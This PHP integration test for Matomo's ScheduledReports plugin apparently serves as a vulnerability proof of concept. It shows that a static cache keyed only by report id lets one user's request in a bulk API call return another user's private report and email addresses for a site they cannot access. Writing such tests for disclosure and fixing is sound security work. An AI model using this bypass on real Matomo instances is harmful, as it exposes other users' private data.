<?php

namespace Piwik\Plugins\ScheduledReports\tests\Integration;

use Piwik\Date;
use Piwik\Plugin\Manager;
use Piwik\Plugins\API\API as BulkAPI;
use Piwik\Plugins\ScheduledReports\API as ScheduledReportsAPI;
use Piwik\Plugins\ScheduledReports\Model as ScheduledReportsModel;
use Piwik\Plugins\SitesManager\API as SitesManagerAPI;
use Piwik\Plugins\UsersManager\Model as UsersManagerModel;
use Piwik\Tests\Framework\Mock\FakeAccess;
use Piwik\Tests\Framework\TestCase\IntegrationTestCase;

class CacheAuthIsolationTest extends IntegrationTestCase
{
    private int $siteA;
    private int $siteB;
    private int $reportId;

    public function setUp(): void
    {
        parent::setUp();

        FakeAccess::$superUser = true;
        Manager::getInstance()->loadPlugins([
            'API',
            'UsersManager',
            'SitesManager',
            'ScheduledReports',
            'VisitsSummary',
        ]);
        Manager::getInstance()->installLoadedPlugins();

        $this->siteA = (int) SitesManagerAPI::getInstance()->addSite(
            'H1 private site A',
            ['https://a.example.test']
        );
        $this->siteB = (int) SitesManagerAPI::getInstance()->addSite(
            'H1 unrelated site B',
            ['https://b.example.test']
        );

        $users = new UsersManagerModel();
        $now = Date::now()->getDatetime();

        $users->addUser(
            'cache_user_a',
            'not-a-login-password',
            'cache_user_a@example.test',
            $now
        );
        $users->addUserAccess('cache_user_a', 'view', [$this->siteA]);
        $users->addTokenAuth(
            'cache_user_a',
            'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa',
            'H1 user A token',
            $now
        );

        $users->addUser(
            'cache_user_b',
            'not-a-login-password',
            'cache_user_b@example.test',
            $now
        );
        $users->addUserAccess('cache_user_b', 'view', [$this->siteB]);
        $users->addTokenAuth(
            'cache_user_b',
            'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb',
            'H1 user B token',
            $now
        );

        $model = new ScheduledReportsModel();
        $this->reportId = (int) $model->createReport([
            'idsite' => $this->siteA,
            'login' => 'cache_user_a',
            'description' => 'USER_A_PRIVATE_REPORT',
            'idsegment' => null,
            'period' => 'day',
            'period_param' => 'day',
            'hour' => 7,
            'type' => 'email',
            'format' => 'pdf',
            'reports' => json_encode(['VisitsSummary_get']),
            'parameters' => json_encode([
                'displayFormat' => 1,
                'emailMe' => false,
                'additionalEmails' => ['user-a-private@example.test'],
                'evolutionGraph' => false,
            ]),
            'ts_created' => $now,
            'ts_last_sent' => null,
            'deleted' => 0,
            'evolution_graph_within_period' => 0,
            'evolution_graph_period_n' => 1,
        ]);

        ScheduledReportsAPI::$cache = [];
    }

    public function testBulkRequestLeaksCrossUserCrossSiteReportThroughStaticCache(): void
    {
        // Secure control: B has some Matomo view access (site B), but neither
        // ownership of A's report nor access to A's site. A direct B-only call
        // must therefore fail.
        ScheduledReportsAPI::$cache = [];
        $control = BulkAPI::getInstance()->getBulkRequest([
            $this->bulkUrl('bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb'),
        ]);

        fwrite(STDOUT, "\nSITE_A={$this->siteA} SITE_B={$this->siteB} REPORT_ID={$this->reportId}\n");
        fwrite(STDOUT, "CONTROL_B_ALONE=" . json_encode($control) . "\n");
        self::assertSame('error', $control[0]['result'] ?? null);

        // Candidate: A populates ScheduledReports::$cache under an idReport-only
        // key. B then asks for the identical key in the same bulk request.
        // The cache-hit return occurs before login ownership and idSite checks.
        ScheduledReportsAPI::$cache = [];
        $result = BulkAPI::getInstance()->getBulkRequest([
            $this->bulkUrl('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'),
            $this->bulkUrl('bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb'),
        ]);

        fwrite(STDOUT, "BULK_RESULT=" . json_encode($result) . "\n");

        self::assertSame('cache_user_a', $result[0][0]['login'] ?? null);
        self::assertSame($this->siteA, (int) ($result[0][0]['idsite'] ?? 0));
        self::assertSame('USER_A_PRIVATE_REPORT', $result[0][0]['description'] ?? null);

        // Authorization failure: B gets A's object for site A despite B having
        // view access only to site B.
        self::assertSame('cache_user_a', $result[1][0]['login'] ?? null);
        self::assertSame($this->siteA, (int) ($result[1][0]['idsite'] ?? 0));
        self::assertSame('USER_A_PRIVATE_REPORT', $result[1][0]['description'] ?? null);
        self::assertSame(
            ['user-a-private@example.test'],
            $result[1][0]['parameters']['additionalEmails'] ?? null
        );

        fwrite(STDOUT, "H1_RESULT=PASS cross-user cross-site ScheduledReports disclosure via API.getBulkRequest\n");
    }

    private function bulkUrl(string $token): string
    {
        return rawurlencode(http_build_query([
            'module' => 'API',
            'method' => 'ScheduledReports.getReports',
            'idReport' => $this->reportId,
            'token_auth' => $token,
            'format' => 'json',
        ], '', '&', PHP_QUERY_RFC3986));
    }

    public function provideContainerConfig()
    {
        return ['Piwik\\Access' => new FakeAccess()];
    }
}
